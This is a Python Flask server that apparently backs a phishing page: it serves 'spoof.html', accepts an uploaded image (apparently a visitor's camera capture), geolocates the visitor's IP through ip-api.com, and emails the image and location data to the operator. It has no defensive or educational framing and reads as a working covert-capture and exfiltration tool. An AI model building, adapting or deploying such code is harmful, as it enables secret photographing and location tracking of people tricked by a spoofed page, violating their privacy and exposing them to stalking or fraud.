from flask import Flask, request
import os
import datetime
import requests
import base64
from mail import send_mail_packet

app = Flask(__name__)
os.makedirs("captures", exist_ok=True)


def encode_filestorage(fs):
    data = fs.read()
    fs.seek(0)
    return base64.b64encode(data).decode()

@app.route("/")
def index():
    return open("static/spoof.html").read()

@app.route("/upload", methods=["POST"])
def upload():
    f = request.files.get("image")
    if not f:
        return "NO FILE", 400

    ip = request.remote_addr
    resp = requests.get(f"http://ip-api.com/json/{ip}").json()
    print(resp)
    
    b64 = encode_filestorage(f)
    
    try:
        send_mail_packet(b64,str(resp))
    except Exception as e:
        print(e)

    # Use in case of local testing --->
    # ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    # img_path = os.path.join("captures", f"{ts}.jpg")
    # f.save(img_path)
    # with open(os.path.join("captures", f"{ts}.txt"), "w") as fp:
    #     fp.write(str(resp))

    return "OK"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
